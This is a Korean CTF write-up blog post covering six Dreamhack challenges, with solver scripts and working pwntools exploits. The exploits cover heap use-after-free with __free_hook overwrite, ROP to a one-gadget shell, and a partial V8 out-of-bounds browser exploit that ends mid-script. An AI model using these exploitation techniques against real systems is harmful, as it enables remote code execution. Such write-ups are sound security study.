---
title: 2022 Spring GoN Open Qual Writeup
author: G0RiyA
date: 2022-03-23 15:00:00 +0900
categories: [Writeup]
tags: [writeup, GoN, Dreamhack, CTF]
math: true
mermaid: true
# image:
#   src: /assets/img/post-1/1.png
#   alt: image alternative text
---

![1.png](/assets/img/post-1/1.png)
GoN에서 드림핵에 CTF를 열었다.\
크게 할 일도 없었고, 재밌는 문제도 많아 보이는 데다가 상위 3명에겐 치킨도 준대서 꽤 열심히 참여했다.

![2.png](/assets/img/post-1/2.png)
대회는 2위로 마무리 했고, 재밌게 풀었던 문제들이 많아서 풀이를 해보려고 한다.

---

## A. CS448 - Crypto

운좋게 퍼블딴 문제이다.

대충 보면 아래와 같은 `encrypt`함수를 사용해서 플래그를 암호화해서 사용자에게 전달한다.

```python
def encrypt(s, k):
    res = ""
    if k <= len(s):
        _print("[!] key shold be larger then len(pt) for safty!!")
        return ""
    for i, c in enumerate(s):
        enc = (get_random_u8() + key * i) % 0xff
        enc = ord(c) ^ enc
        res += hex(enc)[2:].rjust(2, "0")
    return res
```

완전한 랜덤 값을 이용해서 xor을 하는 것 같지만 잘 보면 `& 0xFF`가 아닌 `% 0xFF`를 통해서 키를 byte크기로 맞춘다.\
때문에 xor하는 key의 값이 절대로 255가 될 수 없고 따라서 무한으로 요청을 날리면서 `(끝끝내 나오지 않는 하나의 값) ^ 255`를 하면 플래그의 각 바이트를 구할 수 있다.

그리고 마침 이번 해킹캠프에 냈던 문제와 컨셉이 겹쳐서 poc 코드를 조금 수정해서 풀이하였다.

> Solution Script

```python
from pwn import *

# p = process(['python','-u','./chall.py'])
p = remote("wargame.goatskin.kr", 42917)
# context.log_level= 0

key_set = set(list(range(255)))
rand_set = set(list(range(256)))
my_key = list(rand_set - key_set)[0]

p.sendlineafter(b'>> ','3')
p.sendlineafter(b'>> ','255')
p.recvuntil(b': ') 
flag_len = len(p.recvline())//2

flag_set = [list(range(256)) for _ in range(flag_len)]
flag = [' ' for _ in range(flag_len)]

count = 0
while sum([len(i) for i in flag_set]) > flag_len:
    p.sendlineafter(b'>> ','3')
    p.sendlineafter(b'>> ','255')
    p.recvuntil(b': ')
    enc = bytes.fromhex(p.recvline().strip().decode())
    
    for i in range(flag_len):
        if flag_set[i].count(enc[i]) == 1:
            flag_set[i].pop(flag_set[i].index(enc[i]))
        if len(flag_set[i]) == 1:
            flag[i] = chr(flag_set[i][-1] ^ my_key)
    print(''.join(flag))
    print(' '.join([str(len(i)) for i in flag_set]))
    count += 1

print(count)
print(''.join(flag))
```

## B. Oxidized - Pwnable

Rust 포너블 문제이다.\
정확하지 않은 정보이지만, 예전에 얼핏 듣기로는 러스트가 BOF 같은 low level 취약점으로부터 C언어보다 안전하도록 만들어졌다고 들어서 신기한 컨셉이라고 느껴졌다. 

문제의 가장 큰 취약점은 UAF였다.

특정 크기의 tcache를 꽉 채우고 tcache에 들어가지 않는 큰 크기의 공간을 할당하여 UAF를 통해 libc의 주소를 얻었다.

또, free된node에 적당히 아다리를 맞추면서 update를 할 때\
사이즈를 0으로 주게 되면 또 다른 free된 공간의 node에 write를 할 수 있는 버그가 존재하였다.

이를 이용해서 특정 노드를 아다리가 맞게 이름을 적당히 설정하고\
해당 노드의 포인터를 `__free_hook`으로 변환한 뒤에 `is_string`을 false값으로 읽어지도록 노드를 수정하였다.

이때, 위 과정을 정확하게 수행하기 위해서 몇 시간의 동적디버깅 끝에 오프셋을 모두 뽑았다 ㅠ

또, update하는 과정에서 `__free_hook` 주소를 입력할 때 `read_str`를 호출하게 되는데\
이때 해당 함수에서 UTF-8에 valid하지 않은 인풋이 들어오면 프로세스가 죽어버리는 현상이 있었다.\
이 때문에 `__free_hook` 주소의 모든 바이트가 0x80보다 작은지 검사하고 아니면 다시 연결하는 조건을 추가했다.\
단순 계산으로 약 1/16 정도의 확률이므로 조건을 맞추기는 어렵지 않았으나\
리모트 환경에서 한 번 프로세스를 실행하면 다시 연결할 수 없어서 접속 한 번 할 때마다 vm을 다시 요청해야했다...

\+ 대회가 끝난 후에 출제자 writeup을 봤을 땐 UTF-8 문제가 없어보여서 나중에 한 번 이유를 알아보기로 했다.

이후, 덮어 씌워진 노드를 update해서 `__free_hook`의 값을 `system` 주소로 수정했고\
`/bin/sh\x00`을 하나 만들고 삭제해서 쉘을 휙득하였다. 

 \
아다리만 맞으면 그대로 돌리고 가져가서 코드가 좀 지저분하다

> Exploit Script

```python
from http import cookies
from pwn import *
import requests

REMOTE=1
e = ELF('./chal_patched')
libc = ELF('./libc-2.27.so')

def insert(key,value,size=None):
    if LOGGING:
        if size is not None:log.info(f"insert({key=}, {value=}, {size=})")
        else:log.info(f"insert({key=}, {value=})")
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'key >> ', str(key).encode())
    if isinstance(value, bytes):
        assert size is not None
        p.sendlineafter(b'is it String? (Y/N) >> ', b'Y')
        p.sendlineafter(b'size >> ', str(size).encode())
        p.sendlineafter(b'>> ', value)
    else:
        p.sendlineafter(b'is it String? (Y/N) >> ', b'N')
        p.sendlineafter(b'>> ', str(value).encode())

def search(key):
    if LOGGING:log.info(f"search({key=})")
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'key >> ', str(key).encode())
    
def update(key, value, size=None):
    if LOGGING:log.info(f"update({key=}, {value=}, {size=})")
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'key >> ', str(key).encode())
    if isinstance(value, bytes):
        assert size is not None
        p.sendlineafter(b'size >> ', str(size).encode())
        p.sendlineafter(b'>> ', value)
    else:
        p.sendlineafter(b'>> ', str(value).encode())

def delete(key):
    if LOGGING:log.info(f"delete({key=})")
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'key >> ', str(key).encode())

def viewall():
    if LOGGING:log.info(f"viewall()")
    p.sendlineafter(b'>> ', b'5')

while 1:
    try:
        LOGGING= False
        if REMOTE:
            pause()
            x = requests.get("https://dreamhack.io/api/v1/ctf/ctfs/24/challenges/177/vms/", cookies="""내 쿠키""").json()[0] # 빠르게 주소를 가져오기 위한 코드 ㅎㅎ;;

            host = x['host']
            port = x['port_mappings'][0][1]

            print(host, port)
            p = remote(host, port)
            LOGGING = True

        # if REMOTE:p = remote('192.168.2.1',13100)
        else:p = e.process(aslr=True)

        for i in range(7):
            insert(i + 0x60, str(i+1).encode(),0x60)
        for i in range(7):
            delete(i + 0x60)

        insert(0x70, b'DEADBEEF',0x420)
        insert(0xD0, 0xcafebabe)

        viewall()
        libc.address = base = int(p.recvuntil(b'1. Insert item',drop=True).splitlines()[6].split()[0]) - 0x3ebcb0
        log.success(f'LIBC: {hex(base)}')

        viewall()
        if REMOTE:heap = int(p.recvuntil(b'1. Insert item',drop=True).splitlines()[2].split()[0]) - 21088
        else:heap = int(p.recvuntil(b'1. Insert item',drop=True).splitlines()[2].split()[0]) - 21344
        log.success(f'HEAP: {hex(heap)}')

        target = 0x5468 + heap
        if REMOTE:target-=0x100
        print(target)

        viewall()
        victim = 0x70
        print(hex(victim))

        print(p64(target))

        if any(i>=0x80 for i in p64(target)):
            p.sendlineafter(b'>> ',b'6')
            assert 0
            
        pause()
        LOGGING = True
        update(victim, b'\x60'*8+p64(target), 0)

        writer = int(b'60'*8,16)
        update(writer, libc.symbols['__free_hook'])
        update(0xD0, libc.symbols['system'])
        insert(1,b'/bin/sh\x00',0x10)
        delete(1)

        p.interactive()
    except EOFError:
        p.close()
        continue
    except AssertionError:
        p.close()
        continue
```

## C. RUN - Reversing

바이너리를 분석해보면 아주 깔끔하게 인코딩 루틴만 존재한다.

인코딩 루틴은 크게 복잡하지 않았고 아래와 같았다.

1. 인풋 파일의 모든 비트를 `char[]`에 저장한다.
2. 해당 배열을 처음부터 돌면서 0이 나오면 반복되는 0의 수를 센다.
3. 반복되는 0의 수의 값을 c라고 했을 때, c의 비트 수 만큼 1을 output 버퍼에 추가한다.
4. c를 `little-endian`으로 output 버퍼에 추가한다.
5. 만약 1이 나오면 output 버퍼에 `00`을 추가한다.
6. 배열이 끝난 후엔, output 버퍼의 값을 온전한 바이트로 전환하기 위해 1로 패딩을 해준다.
7. `{input file name}.enc` 파일에 버퍼를 출력한다.

이처럼 단순한 비트 압축 방식으로 인코딩이 되어있으므로 간단한 파이썬 스크립트를 작성하여 풀이하였다.\
그런데 아주 사소한 실수를 발견하지 못해서 푸는 데에 생각보다 시간을 좀 많이 썼었다.

> Solution Script

```python
with open("flag.enc", "rb") as f:
    f.read(8)
    t= f.read()

b = ''.join(bin(i)[2:].zfill(8)[::-1] or "little-endian -> big-endian" for i in t)

g = ''
i = 0
c = 0
while i < len(b):
    c = 0
    try:
        while b[i + c] == '1':c += 1
    except:break

    assert(b[i + c] == '0')

    c += 1
    r = ''
    for j in range(c):
        r = b[i + c + j] + r

    assert(b[i+c+j] == '1' or c == 1),(b[i+c+j], c, b[i+c:i+c+c], b[i:i+c], g)

    g += '0' * int(r, 2) + '1'
    i += c * 2

print(len(g)&7)
r = [int(g[i:i+8][::-1] or "big-endian -> little-endian", 2) for i in range(0, len(g), 8)]
print(bytes(r)[:16])

with open('x', 'wb') as f:
    f.write(bytes(r))
```

## D. Nonsense - Reversing

크지 않은 바이너리를 가진 리버싱 문제였다.

대충 요약하면, argv[1]으로 길이가 48인 인풋을 받고 2바이트씩 쪼개서 알 수 없는 연산을 한 후에 테이블의 값과 비교를 하는 바이너리이다.

하지만 그 알 수 없는 연산은 대충 봤을 때, 지옥 불구덩이의 용암 같은 열정도 당장 베스킨라빈스 아이스크림이 되도록 생겨 먹어서 분석하고 싶지 않았따.

이 떄문에, 해당 연산을 수행하는 함수에 2 byte씩 대입하는 코드를 작성하여 플래그를 얻기로 하였고\
앵거를 사용하면 좋았겠지만, 쓸 줄 몰라서 gdb script를 통해 스크립트를 작성하였다.

> Solution Script

```python
#!gdb nonsense -x
import gdb

a,b = 0x20, 0x20
r = [[] for _ in range(24)]

class bpa(gdb.Breakpoint):
    def stop(self):
        global a, b
        # print(a,b)
        gdb.execute(f"set $rdi={(a << 8) | b}")
        return False

t= [0x00000000AB1FF171, 0x00000000116437CE, 0x00000000E6049FC0, 0x00000000452929D1, 0x0000000075A447EB, 0x00000000C9E8CDA8, 0x000000001CDB0144, 0x00000000F6D4EA9C, 0x000000001CDB0144, 0x00000000C64319B3, 0x00000000F2D03C54, 0x00000000CABE6234, 0x000000001195A6AB, 0x00000000DC8A5604, 0x00000000A7DC071B, 0x000000003ED216D4, 0x00000000D05424C0, 0x000000001A13D5D9, 0x00000000E8A2E464, 0x000000008469B42D, 0x00000000F6D4EA9C, 0x00000000452929D1, 0x00000000BAEBBCB0, 0x00000000EBB57056]
r= [None for _ in (t)]

class bpb(gdb.Breakpoint):
    def stop(self):
        global a, b, r

        try:
            x = int(gdb.execute("p $rax",to_string=True).split("=")[1].strip()) & 0xFFFFFFFFFFFFFFFF
            if x in t:
                print(x, a, b)
                i = 0
                while 1:
                    try:r[(i := t.index(x, i) + 1) - 1] = chr(b)+chr(a)
                    except:break
                    
        except gdb.MemoryError:
            print(hex(x), a, b)

        if (b := b + 1) == 0x7f:
            print(a)
            if (a := a + 1) == 0x7f:
                print(r)
                print(''.join(r))
                gdb.execute("q")
            b = 0x20

        gdb.execute("set $rip=0x555555400B78")

        return False

gdb.execute("file nonsense")

gdb.execute("aslr off")

bpa("* 0x555555400B7A")
bpb("* 0x555555400b7f")

gdb.execute("r asdfasdfasdfsadfasdfasdfasdfsadfasdfasdfasdfsadf")
```

## E. NullNull - Pwnable

바이너리를 분석해보면 아래와 같은 함수가 있다.

```c
int sub_13BD(){
  __int64 v1; // [rsp-50h] [rbp-50h]

  if ( __isoc99_scanf("%80s", &v1) != 1 )
    _exit(1);
  return puts(&v1);
}
```

안전하게 입력 받은 문자열을 그대로 출력해주는 것 같지만, `scanf`의 `%s`로 입력을 받기 때문에\
`v1[입력받은 문자열의 길이]`에 0이 들어가게 되어서 `sfp`의 최하위 바이트를 0으로 덮을 수가 있다.\
때문에, rbp의 값이 비정상적으로 변하게 되고, 함수의 리턴이 연속으로 2회 일어나게 되면 rip가 의도되지 않은 곳으로 이동한다.

또한, `sub_13BD`의 상위 함수의 변수들은 rbp를 기반으로 참조되기 때문에\
스택의 8bytes read write 인덱스를 제한하는 기존의 32라는 값이 저장된 스택의 주소가 아니라\
변조된 rbp를 통해 다른 주소의 값을 참조하게 하면서 스택의 read write 과정에서 oob가 발생하게 된다.

따라서 올바르게 작동하는 경우의 수 하나를 이용하여 ROP를 하는 익스플로잇을 짜고\
아다리가 맞을 때까지 연결하면 쉘을 얻을 수 있다.

> Exploit Script

```python
from pwn import *
import struct

e = ELF('./nullnull_patched')
libc = e.libc

def read(idx):
    log.info(f'read({idx=})')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def write(idx, val):
    log.info(f'write({idx=}, {val=})')
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(val).encode())

def echo(val):
    log.info(f'echo({val=})')
    p.sendline(b'1')
    p.sendline(val)

def re():
    log.info(f're()')
    p.sendline(b'0')

def out():
    log.info(f'out()')
    p.sendline(b'-1')

while 1:
    # p = e.process()
    p= remote('host1.dreamhack.games', 14359)

    echo(b'1'*80)
    p.recvline()

    read(37)
    try:base = int(struct.pack(">q",int(p.recvline())).hex(),16)
    except EOFError:
        p.close()
        continue
    if base==0:
        p.close()
        continue
    base -= libc.symbols['__libc_start_main'] + 0xf3
    if base&0xFF!=0:
        p.close()
        continue

    print(hex(base))
    rdx_r12 = 0x0000000000119241 + base
    rsi = 0x000000000002604f + base
    oneshot = 0xe3d29 + base

    write(3, rdx_r12)
    write(4, 0)
    write(5, 0)
    write(6, rsi)
    write(7, 0)
    write(8, oneshot)

    re()

    p.interactive()
    break
```

## F. Unconventional - Reversing

rax와 rsp의 역할이 바뀐 평행세계의 바이너리를 컨셉으로 한 문제이다.

rax를 통해 push, pop하는 과정과 함수를 호출하는 과정이 얼핏 생각하면 당연하지만 참신하고 재미있게 느껴졌다.

일단 바이너리를 분석해보면 크기가 크지 않기 때문에\
어렵지 않게 어떠한 루틴을 갖고 동작하는지 알 수 있었다.

fgets를 통해 길이가 48인 입력을 받고, 입력을 길이가 16인 블록으로 쪼개서 연산한다.

연산은 x라고 임의로 정의한 `[0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C]` 값과 함께 진행된다.

각 블록별로 0xC0FF33번 연산을 반복하는데, 연산의 과정은 아래와 같았다.

1. 블럭을 ARIA의 2번째 sbox로 `substitute`
2. 블럭을 AES 방식으로 `shift row`
3. `[0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]`을 이용하여 블럭에다가 xor, add, rol
4. x와 블록을 xor
5. x에다가 1 ~ 3 연산

이를 대충 파이썬 스크립트로 변환하면 아래와 같았다.

```python
from tqdm import tqdm # progress bar
x = [0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C]
comp = [0x89, 0xB4, 0xF7, 0x8F, 0xE1, 0x8B, 0x29, 0x0D, 0x37, 0xB1, 0x56, 0xC0, 0xF0, 0x75, 0x42, 0x8E, 0x1C, 0xC4, 0x2D, 0x1D, 0xD9, 0x2E, 0xD4, 0x83, 0x55, 0xEE, 0x6B, 0xAD, 0x53, 0x40, 0x79, 0x65, 0x07, 0x9A, 0x0A, 0xB2, 0x9F, 0x82, 0x99, 0x10, 0xDF, 0x45, 0x22, 0x6B, 0x50, 0xDB, 0x0B, 0x40]
sbox = [0xE2, 0x4E, 0x54, 0xFC, 0x94, 0xC2, 0x4A, 0xCC, 0x62, 0x0D, 0x6A, 0x46, 0x3C, 0x4D, 0x8B, 0xD1, 0x5E, 0xFA, 0x64, 0xCB, 0xB4, 0x97, 0xBE, 0x2B, 0xBC, 0x77, 0x2E, 0x03, 0xD3, 0x19, 0x59, 0xC1, 0x1D, 0x06, 0x41, 0x6B, 0x55, 0xF0, 0x99, 0x69, 0xEA, 0x9C, 0x18, 0xAE, 0x63, 0xDF, 0xE7, 0xBB, 0x00, 0x73, 0x66, 0xFB, 0x96, 0x4C, 0x85, 0xE4, 0x3A, 0x09, 0x45, 0xAA, 0x0F, 0xEE, 0x10, 0xEB, 0x2D, 0x7F, 0xF4, 0x29, 0xAC, 0xCF, 0xAD, 0x91, 0x8D, 0x78, 0xC8, 0x95, 0xF9, 0x2F, 0xCE, 0xCD, 0x08, 0x7A, 0x88, 0x38, 0x5C, 0x83, 0x2A, 0x28, 0x47, 0xDB, 0xB8, 0xC7, 0x93, 0xA4, 0x12, 0x53, 0xFF, 0x87, 0x0E, 0x31, 0x36, 0x21, 0x58, 0x48, 0x01, 0x8E, 0x37, 0x74, 0x32, 0xCA, 0xE9, 0xB1, 0xB7, 0xAB, 0x0C, 0xD7, 0xC4, 0x56, 0x42, 0x26, 0x07, 0x98, 0x60, 0xD9, 0xB6, 0xB9, 0x11, 0x40, 0xEC, 0x20, 0x8C, 0xBD, 0xA0, 0xC9, 0x84, 0x04, 0x49, 0x23, 0xF1, 0x4F, 0x50, 0x1F, 0x13, 0xDC, 0xD8, 0xC0, 0x9E, 0x57, 0xE3, 0xC3, 0x7B, 0x65, 0x3B, 0x02, 0x8F, 0x3E, 0xE8, 0x25, 0x92, 0xE5, 0x15, 0xDD, 0xFD, 0x17, 0xA9, 0xBF, 0xD4, 0x9A, 0x7E, 0xC5, 0x39, 0x67, 0xFE, 0x76, 0x9D, 0x43, 0xA7, 0xE1, 0xD0, 0xF5, 0x68, 0xF2, 0x1B, 0x34, 0x70, 0x05, 0xA3, 0x8A, 0xD5, 0x79, 0x86, 0xA8, 0x30, 0xC6, 0x51, 0x4B, 0x1E, 0xA6, 0x27, 0xF6, 0x35, 0xD2, 0x6E, 0x24, 0x16, 0x82, 0x5F, 0xDA, 0xE6, 0x75, 0xA2, 0xEF, 0x2C, 0xB2, 0x1C, 0x9F, 0x5D, 0x6F, 0x80, 0x0A, 0x72, 0x44, 0x9B, 0x6C, 0x90, 0x0B, 0x5B, 0x33, 0x7D, 0x5A, 0x52, 0xF3, 0x61, 0xA1, 0xF7, 0xB0, 0xD6, 0x3F, 0x7C, 0x6D, 0xED, 0x14, 0xE0, 0xA5, 0x3D, 0x22, 0xB3, 0xF8, 0x89, 0xDE, 0x71, 0x1A, 0xAF, 0xBA, 0xB5, 0x81]
g = [0x91,0xd7,0x36,0x58,0x87,0xb1,0x36,0x58,0x87,0xd7,0xce,0x58,0x87,0xd7,0x36,0xd9]
p = [0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]

a = bytes(comp)[:16]
r = 0xC0FF33

def rol(x,n):
    return ((x << n) | (x >> (8 - n))) & 0xFF

def sub(a):
    t = [sbox[i] for i in a]
    for i in range(16):
        a[i]=t[i]
    return a

def shift_row(a):
    for i in range(1,4):
        a[i],a[i + 4],a[i + 8],a[i + 12]=a[(i - 4 * i)%16],a[(i - 4 * i + 4)%16],a[(i - 4 * i + 8)%16],a[(i - 4 * i + 12)%16]
    return a

def enc(a):
    x = 0
    for _ in range(16):
        a[x] ^= p[x]|(p[x]<<4)
        x = p[x]
    x = 0
    for _ in range(16):
        a[p[x]] += a[x]
        a[p[x]] &= 0xFF
        x = p[x]
    x = 0
    for _ in range(16):
        a[x] = rol(a[x], p[x]&7)
        x= p[x]
    return a

def xor(a,b):
    for i in range(16):
        a[i] ^= b[i]
    return a


a = list(b'zxcvasdfqwer1234')

for _ in tqdm(range(r)):
    sub(a)
    shift_row(a)
    enc(a)

    xor(a, x)

    sub(x)
    shift_row(x)
    enc(x)

print(bytes(a).hex(sep=' '))
```

파이썬을 이용해서 코드를 포팅해서 처음에는 파이썬으로 역연산 하려고 했지만\
연산 속도가 너무 느려서 C++로 역연산 스크립트를 작성하였다.

> Solution Script

```c++
#include <iostream>
using namespace std;
unsigned int x[] = {0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C};
unsigned int comp[] = {0x89, 0xB4, 0xF7, 0x8F, 0xE1, 0x8B, 0x29, 0x0D, 0x37, 0xB1, 0x56, 0xC0, 0xF0, 0x75, 0x42, 0x8E, 0x1C, 0xC4, 0x2D, 0x1D, 0xD9, 0x2E, 0xD4, 0x83, 0x55, 0xEE, 0x6B, 0xAD, 0x53, 0x40, 0x79, 0x65, 0x07, 0x9A, 0x0A, 0xB2, 0x9F, 0x82, 0x99, 0x10, 0xDF, 0x45, 0x22, 0x6B, 0x50, 0xDB, 0x0B, 0x40};
unsigned int sbox[] = {0xE2, 0x4E, 0x54, 0xFC, 0x94, 0xC2, 0x4A, 0xCC, 0x62, 0x0D, 0x6A, 0x46, 0x3C, 0x4D, 0x8B, 0xD1, 0x5E, 0xFA, 0x64, 0xCB, 0xB4, 0x97, 0xBE, 0x2B, 0xBC, 0x77, 0x2E, 0x03, 0xD3, 0x19, 0x59, 0xC1, 0x1D, 0x06, 0x41, 0x6B, 0x55, 0xF0, 0x99, 0x69, 0xEA, 0x9C, 0x18, 0xAE, 0x63, 0xDF, 0xE7, 0xBB, 0x00, 0x73, 0x66, 0xFB, 0x96, 0x4C, 0x85, 0xE4, 0x3A, 0x09, 0x45, 0xAA, 0x0F, 0xEE, 0x10, 0xEB, 0x2D, 0x7F, 0xF4, 0x29, 0xAC, 0xCF, 0xAD, 0x91, 0x8D, 0x78, 0xC8, 0x95, 0xF9, 0x2F, 0xCE, 0xCD, 0x08, 0x7A, 0x88, 0x38, 0x5C, 0x83, 0x2A, 0x28, 0x47, 0xDB, 0xB8, 0xC7, 0x93, 0xA4, 0x12, 0x53, 0xFF, 0x87, 0x0E, 0x31, 0x36, 0x21, 0x58, 0x48, 0x01, 0x8E, 0x37, 0x74, 0x32, 0xCA, 0xE9, 0xB1, 0xB7, 0xAB, 0x0C, 0xD7, 0xC4, 0x56, 0x42, 0x26, 0x07, 0x98, 0x60, 0xD9, 0xB6, 0xB9, 0x11, 0x40, 0xEC, 0x20, 0x8C, 0xBD, 0xA0, 0xC9, 0x84, 0x04, 0x49, 0x23, 0xF1, 0x4F, 0x50, 0x1F, 0x13, 0xDC, 0xD8, 0xC0, 0x9E, 0x57, 0xE3, 0xC3, 0x7B, 0x65, 0x3B, 0x02, 0x8F, 0x3E, 0xE8, 0x25, 0x92, 0xE5, 0x15, 0xDD, 0xFD, 0x17, 0xA9, 0xBF, 0xD4, 0x9A, 0x7E, 0xC5, 0x39, 0x67, 0xFE, 0x76, 0x9D, 0x43, 0xA7, 0xE1, 0xD0, 0xF5, 0x68, 0xF2, 0x1B, 0x34, 0x70, 0x05, 0xA3, 0x8A, 0xD5, 0x79, 0x86, 0xA8, 0x30, 0xC6, 0x51, 0x4B, 0x1E, 0xA6, 0x27, 0xF6, 0x35, 0xD2, 0x6E, 0x24, 0x16, 0x82, 0x5F, 0xDA, 0xE6, 0x75, 0xA2, 0xEF, 0x2C, 0xB2, 0x1C, 0x9F, 0x5D, 0x6F, 0x80, 0x0A, 0x72, 0x44, 0x9B, 0x6C, 0x90, 0x0B, 0x5B, 0x33, 0x7D, 0x5A, 0x52, 0xF3, 0x61, 0xA1, 0xF7, 0xB0, 0xD6, 0x3F, 0x7C, 0x6D, 0xED, 0x14, 0xE0, 0xA5, 0x3D, 0x22, 0xB3, 0xF8, 0x89, 0xDE, 0x71, 0x1A, 0xAF, 0xBA, 0xB5, 0x81};
unsigned int p[] = {0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02};
unsigned int inv_sbox[256];

unsigned int rol(unsigned int x, unsigned int n){
    return ((x << n) | (x >> (8 - n))) & 0xFF;
}
unsigned int ror(unsigned int x, unsigned int n){
    return ((x >> n) | (x << (8 - n))) & 0xFF;
}

void sub(unsigned int a[]){
    for(int i = 0; i < 16; i++) a[i]=sbox[a[i]];
}

void shift_row(unsigned int a[]){
    unsigned int d[4];
    for(int i = 1; i < 4; i++){
        d[0]=a[(i - 4 * i + 64)%16];
        d[1]=a[(i - 4 * i + 4 + 64)%16];
        d[2]=a[(i - 4 * i + 8 + 64)%16];
        d[3]=a[(i - 4 * i + 12 + 64)%16];
        a[i]=d[0];
        a[i + 4]=d[1];
        a[i + 8]=d[2];
        a[i + 12]=d[3];
    }
}

void enc(unsigned int a[]){
    unsigned int x = 0;
    for(int i = 0; i < 16; i++){
        a[x] ^= p[x]|(p[x]<<4);
        a[x] &= 0xFF;
        x = p[x];
    }
    x = 0;
    for(int i = 0; i < 16; i++){
        a[p[x]] += a[x];
        a[p[x]] &= 0xFF;
        x = p[x];
    }
    x = 0;
    for(int i = 0; i < 16; i++){
        a[x] = rol(a[x], p[x]&7);
        a[x] &= 0xFF;
        x = p[x];
    }
}

void xr(unsigned int a[],unsigned int b[]){
    for(int i = 0;i < 16;i++) a[i] ^= b[i];
}

void inv_enc(unsigned int a[]){
    unsigned int x = 0;
    unsigned int t[16];
    for(int i = 0; i < 16; i++){
        t[i] = x;
        x = p[x];
    }
    for(int i = 0; i < 16; i++){
        x = t[15 - i];
        a[x] = ror(a[x], p[x]&7);
        a[x] &= 0xFF;
    }
    for(int i = 0; i < 16; i++){
        x = t[15 - i];
        a[p[x]] -= a[x];
        a[p[x]] &= 0xFF;
    }
    for(int i = 0; i < 16; i++){
        x = t[15 - i];
        a[x] ^= p[x]|(p[x]<<4);
    }
}

void inv_shift_row(unsigned int a[]){
    unsigned int d[4];
    for(int i = 1; i < 4; i++){
        d[0] = a[i];
        d[1] = a[i + 4];
        d[2] = a[i + 8];
        d[3] = a[i + 12];
        a[(i - 4 * i + 64)%16]=d[0];
        a[(i - 4 * i + 4 + 64)%16]=d[1];
        a[(i - 4 * i + 8 + 64)%16]=d[2];
        a[(i - 4 * i + 12 + 64)%16]=d[3];
    }
}

void inv_sub(unsigned int a[]){
    for(int i = 0; i < 16; i++) a[i]=inv_sbox[a[i]];
}

int main(){
    // unsigned int a[]= {154, 93, 38, 210, 111, 102, 0, 197, 218, 246, 231, 246, 205, 56, 1, 249};
    unsigned int *a= comp;
    for(int i = 0; i < 256; i++) inv_sbox[sbox[i]]=i;
    for(int _ = 0; _ < 3; _++){
        for(int i = 0;i < 0xC0FF33; i++){
            sub(x);
            shift_row(x);
            enc(x);
        }
        for(int i = 0;i < 0xC0FF33; i++){
            inv_enc(x);
            inv_shift_row(x);
            inv_sub(x);

            xr(a, x);

            inv_enc(a);
            inv_shift_row(a);
            inv_sub(a);
        }
        for(int i =0; i < 16; i++) cout << (char)a[i];
        a += 16;
    }
    cout << endl;
}
```

## K. baby-turbofan - Pwnable

처음으로 풀어본 V8 문제이다.

문제의 디스크립션에서 언급되는 `Krautflare`는 약간 예전 PlaidCTF의 `ropasaurusrex` 정도의 감성으로 자주 언급되는 입문용 문제인 것 같아보였다.\
해당 문제에서는 위와 동일한 취약점을 갖고 있었지만, `pointer compression`이 적용된 버전이라는 차이가 존재하였다.

V8에 대한 지식이 전무했으므로 다른 문제의 exploit을 짜집기해서 디버깅하는 방식으로 방향을 정하였고\
지금은 카이스트생인 고등학교 후배의 블로그 글을 많이 참고하여 풀이하였다.\
특히 [35C3-Krautflare](https://sunrinjuntae.tistory.com/171)와 [DownUnder-Is this pwn or web?](https://sunrinjuntae.tistory.com/172)을 주로 참고하였다.

위 글에 적혀있는 자세한 취약점 설명은 생략하고 내가 풀이했던 방법은 아래와 같다.

1. `Object.is(-0, -0) * index`를 이용하여 OOB 발생
2. OOB를 통해 힙 포인터 베이스 LEAK
3. 객체 리스트에 값을 넣고 OOB를 이용해 객체의 주소 LEAK
4. 동적디버깅을 이용하여 알아낸 `ArrayBuffer`의 `backing store`위치를 OOB를 통해 접근하여 aar, aaw
5. 쉘코드 실행

정리하면 제목의 baby가 무색하지 않을 상당히 간단한 문제였지만\
이해하고, 오프셋을 구하기 위해 객체들을 붙이고, 구현하는 데에 참 많은 시간이 들었다.

무언가 하나 크게 얻어간 문제였던 것 같다.

> Exploit Script

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

const print = console.log

var tmp_obj = {X:1}

function itof(val) {
   u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
   u64_buf[1] = Number(BigInt(val) >> 32n);
   return f64_buf[0];
}
function hex(val){
   return "0x"+val.toString(16)
}

var oob = undefined, oo = undefined, arb = undefined
function foo(x){
   let aux = {mz:-0};
   let idx = Object.is(Math.expm1(x), aux.mz);
   let a = [0.1,0.2,0.3,0.4,0.5];
   let b = new BigUint64Array([
      0x1111111111111111n,
      0x2222222222222222n,
      0x3333333333333333n,
   ]);

   let c = [tmp_obj, 1.1, 1.2]
   let aaaa = new ArrayBuffer(0x1338);


   oob = b
   oo = c
   arb = aaaa

   idx *= 25;
   a[idx] = itof(0xFFFFFFFF000023e8n)
   return a[idx];
}

foo(0);
for(let i = 0; i < 100000; i++) {
    foo("0");
}

foo(-0)

const base = (BigInt(oob[9]) & 0xFFFFFFFFn) << 32n
print("HEAP BASE : " + hex(base))

function addrof(obj) {
   oo[0] = obj
   return base + (oob[13] & 0xFFFFFFFFn)
}

function aar(addr) {
   oob[20] = addr
   let buf = new BigUint64Array(arb);

   return buf[0];
}

